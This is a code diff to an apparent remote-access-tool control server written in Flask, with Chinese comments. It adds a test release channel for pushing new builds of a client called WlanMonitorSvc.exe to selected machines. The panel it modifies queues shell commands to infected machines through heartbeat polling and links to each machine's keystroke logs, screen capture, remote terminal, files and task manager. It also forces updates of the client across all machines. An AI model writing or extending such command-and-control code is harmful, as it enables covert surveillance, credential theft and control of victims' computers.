@@ -1,6 +1,7 @@
 from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
 from datetime import datetime
 import os, time, json, threading
+import urllib.parse
 from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, encrypt_data, decrypt_data
 
 bp = Blueprint('main', __name__)
@@ -42,32 +43,30 @@ def report_client():
         save_db()
 
         def make_response(payload):
-            return encrypt_data(payload) if clients_db[mac].get("encrypted") else payload
+            return payload
 
         # 长轮询机制：挂起等待最多15秒，高频率检测降低响应延迟到100ms
-        for i in range(150):
+        for i in range(30):
             pending_file_cmd = clients_db[mac].get('pending_file_cmd', '')
             if pending_file_cmd:
                 clients_db[mac]['pending_file_cmd'] = ''
-                save_db()
+                # save_db()
                 return make_response(pending_file_cmd), 200
 
             # 如果有缓存的待执行命令，通过心跳返回让客户端去执行
             pending_cmd = clients_db[mac].get('pending_cmd', '')
             if pending_cmd:
                 clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
-                save_db()
+                # save_db()
                 return make_response(pending_cmd), 200
 
             if i % 10 == 0:
                 clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                save_db()
 
             time.sleep(0.1)
 
         # 循环结束前刷新最后心跳时间
         clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        save_db()
         return make_response("SSID:" + clients_db[mac].get('name', '未命名设备')), 200
 
     return "Missing parameters", 400
@@ -82,6 +81,16 @@ def api_rename():
         clients_db[mac]['name'] = new_name
         save_db()
     return jsonify({"status": "ok"})
+
+@bp.route('/api/toggle_test', methods=['POST'])
+def api_toggle_test():
+    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
+    data = request.json
+    mac = data.get('mac')
+    if mac in clients_db:
+        clients_db[mac]['is_test'] = not clients_db[mac].get('is_test', False)
+        save_db()
+    return jsonify({"status": "ok", "is_test": clients_db[mac]['is_test']})
 
 @bp.route('/api/delete', methods=['POST'])
 def api_delete():
@@ -98,25 +107,37 @@ def update_mgmt():
     if not session.get('logged_in'): return redirect(url_for('auth.login'))
     new_ver = request.form.get('version')
     uploaded_file = request.files.get('file')
+    channel = request.form.get('channel', 'stable') # 新增发布通道区分
 
     if new_ver:
         new_ver_str = new_ver.strip()
+
+        target_dir = UPDATE_DIR
+        if channel == 'test':
+            target_dir = os.path.join(UPDATE_DIR, 'testing')
+            os.makedirs(target_dir, exist_ok=True)
+
         if uploaded_file and uploaded_file.filename != '':
             binary_content = uploaded_file.read()
             # 校验版本号是否被正确编译到二进制文件中
             if new_ver_str.encode('ascii', errors='ignore') not in binary_content:
                 return f"<h2 style='color:red;'>错误：版本校验失败！</h2><p>您输入的版本号 {new_ver_str} 没有包含在上传的 EXE 文件内部。</p><p>请确保您已在 Visual Studio 的代码里修改了 MANUAL_COMPILE_VERSION 并成功重新生成了程序！</p><button onclick='history.back()'>返回重试</button>", 400
 
-            ver_dir = os.path.join(UPDATE_DIR, 'history_versions', new_ver_str)
-            os.makedirs(ver_dir, exist_ok=True)
-            with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
+            if channel == 'stable':
+                ver_dir = os.path.join(UPDATE_DIR, 'history_versions', new_ver_str)
+                os.makedirs(ver_dir, exist_ok=True)
+                with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
+                    f.write(binary_content)
+
+            with open(os.path.join(target_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
                 f.write(binary_content)
 
-            with open(os.path.join(UPDATE_DIR, 'WlanMonitorSvc.exe'), 'wb') as f:
-                f.write(binary_content)
-
-        with open(VERSION_FILE, 'w', encoding='utf-8') as f:
-            f.write(new_ver_str)
+        if channel == 'stable':
+            with open(VERSION_FILE, 'w', encoding='utf-8') as f:
+                f.write(new_ver_str)
+        else:
+            with open(os.path.join(target_dir, 'version.txt'), 'w', encoding='utf-8') as f:
+                f.write(new_ver_str)
 
     import base64
     host_url = request.host_url.rstrip('/')
@@ -127,6 +148,9 @@ def update_mgmt():
 
     # 下发全局紧急更新通知给所有在线设备
     for mac, info in clients_db.items():
+        if channel == 'test' and not info.get('is_test', False):
+            continue # 如果是推测测试包，跳过普通机器不发通知
+
         if is_online(info.get('last_seen', '')):
             client_ver = info.get('ver', '1.0.0')
             if get_version(client_ver) >= [1, 6, 10]:
@@ -218,7 +242,34 @@ def update_server():
 def serve_update(filename):
     if filename not in ['version.txt', 'WlanMonitorSvc.exe']:
         return "拒绝访问", 403
-    response = send_from_directory(UPDATE_DIR, filename)
+
+    # 获取客户端附加的参数并尝试解密
+    enc_mac = request.args.get('mac', '')
+    enc_name = request.args.get('name', '')
+
+    mac = decrypt_data(enc_mac) if enc_mac else ''
+    name = decrypt_data(enc_name) if enc_name else ''
+
+    # 判断该设备是否被服务端在面板标记为处于内测通道
+    is_test = False
+    if mac in clients_db:
+        is_test = clients_db[mac].get('is_test', False)
+
+    # 动态选择要提供下载的目录或者直接重定向文件
+    if is_test:
+        # 如果是内测机，从带 "_test" 后缀的特定文件夹中读取测试版程序及其版本号
+        file_dir = os.path.join(UPDATE_DIR, 'testing')
+        if not os.path.exists(file_dir):
+            os.makedirs(file_dir)
+    else:
+        # 否则常规机器读取原本目录下的发布版
+        file_dir = UPDATE_DIR
+
+    # 兜底：如果测试目录找不到该文件，自动回退到默认目录
+    if not os.path.exists(os.path.join(file_dir, filename)):
+        file_dir = UPDATE_DIR
+
+    response = send_from_directory(file_dir, filename)
     response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
     response.headers["Pragma"] = "no-cache"
     response.headers["Expires"] = "0"
@@ -256,19 +307,25 @@ def tables_partial():
                     {{ info.name }} 
                     <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                 </td>
-                <td>v{{ info.ver }}</td>
+                <td>
+                    v{{ info.ver }}
+                    <br><button onclick="toggleTest('{{ mac }}')" style="padding:2px 5px; border:none; border-radius:3px; font-size:10px; margin-top:4px; cursor:pointer; background: {{ '#ffc107' if info.get('is_test') else '#6c757d' }}; color: {{ '#000' if info.get('is_test') else '#fff' }};">{{ '🧪内测通道状态' if info.get('is_test') else '✅稳定版(点击切换内测)' }}</button>
+                </td>
                 <td style="color:#007bff; font-weight:bold; max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="{{ info.fg|default('暂无') }}">{{ info.fg|default('暂无') }}</td>
                 <td>{{ info.last_seen }}</td>
                 <td>
+                    <button onclick="toggleTest('{{ mac }}')" style="background:{{ '#28a745' if info.get('is_test') else '#6c757d' }}; color:#fff; padding:4px 8px; font-size:12px; border:none; cursor:pointer;">
+                        {{ '🟢 测试通道' if info.get('is_test') else '⚪ 设为测试' }}
+                    </button>
                     <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
                     <button onclick="quickCmd('{{ mac }}', 'shutdown /r /t 0')" style="background:#ffc107; color:#000; padding:4px 8px; font-size:12px;">重启</button>
                     <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
                     <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
                     <a href="/taskmgr/{{ mac }}" style="background:#6f42c1; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📊 任务管理</a>
                     <a href="/screen/{{ mac }}" style="background:#fd7e14; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📺 屏幕画面</a>
-                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
-                    <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
-                    <a href="/entertainment/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🎵 娱乐控制</a>
+                    <a href="/keylog/{{ mac }}" style="background:#20c997; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🔤 键盘记录</a>
+                    <a href="/view_log/{{ mac }}" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📜 运行日志</a>
+                    <a href="/entertainment/{{ mac }}" style="background:#e83e8c; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">🎵 娱乐控制</a>
                 </td>
                 <td class="status-online">📡 在线</td>
             </tr>
@@ -307,13 +364,16 @@ def tables_partial():
                     {{ info.name }}
                     <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                 </td>
-                <td style="color:#777;">v{{ info.ver }}</td>
+                <td style="color:#777;">
+                    v{{ info.ver }}
+                    <br><span style="padding:2px 4px; border-radius:3px; font-size:10px; background: {{ '#ffc107' if info.get('is_test') else '#6c757d' }}; color: {{ '#000' if info.get('is_test') else '#fff' }};">{{ '🧪内测状态' if info.get('is_test') else '稳定版' }}</span>
+                </td>
                 <td style="color:#777;">{{ info.last_seen }}</td>
                 <td>
                     <button onclick="deleteClient('{{ mac }}')" style="background:#dc3545; color:#fff; padding:5px 10px; border:none; border-radius:4px; font-size:14px; cursor:pointer; margin-right:5px;">🗑️ 删除</button>
                     <a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block;">📝 查看遗留日志</a>
-                    <a href="/view_log/{{ mac }}" target="_blank" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
-                    <a href="/keylog/{{ mac }}" target="_blank" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
+                    <a href="/view_log/{{ mac }}" style="background:#e83e8c; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">📜 运行日志</a>
+                    <a href="/keylog/{{ mac }}" style="background:#20c997; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px; display:inline-block; margin-left:5px;">🔤 键盘记录</a>
                 </td>
                 <td class="status-offline">已离线</td>
             </tr>
@@ -384,12 +444,16 @@ def index():
                 <p>当前全网服务器提供的最新强制更新版本号：<b style="color:red; font-size:18px;">{{ current_server_version }}</b></p>
                 <form action="/update_mgmt" method="post" enctype="multipart/form-data">
                     <label>1. 发布新版本号(填入更高版本号单下发更新通知):</label><br>
-                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 10px 0; width: 250px;">
+                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 5px 0 15px 0; width: 250px;">
                     <br>
-                    <label>2. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
-                    <input type="file" name="file" accept=".exe" style="margin: 10px 0;">
+                    <label>2. 选择要发布的通道群体:</label><br>
+                    <label style="margin-right:15px; cursor:pointer;"><input type="radio" name="channel" value="stable" checked> 发布为稳定版(全网所有终端接收)</label>
+                    <label style="cursor:pointer; color:#b18602; font-weight:bold;"><input type="radio" name="channel" value="test"> 发布为内测先行版(仅后台手动标记为内测的特定机器接收)</label>
+                    <br><br>
+                    <label>3. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
+                    <input type="file" name="file" accept=".exe" style="margin: 5px 0 10px 0;">
                     <br>
-                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">更新并发布推送全网</button>
+                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">校验并立刻推送执行更新</button>
                 </form>
 
                 <hr style="border: 1px solid #ccc; margin: 20px 0;">
@@ -484,7 +548,17 @@ def index():
 
             // 初始化立即加载，然后每间隔 1 秒刷一次
             fetchTables();
-            setInterval(fetchTables, 1000);
+            setInterval(fetchTables, 3000);
+
+            window.toggleTest = function(mac) {
+                fetch('/api/toggle_test', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ mac: mac })
+                }).then(() => {
+                    fetchTables(); // 直接刷新列表看到新名称/新状态
+                });
+            };
 
             // 通过 JS 发送重命名更新（防止由于全页面刷新打断用户填写或者页面滚动异常）
             window.promptRename = function(mac, oldname) {
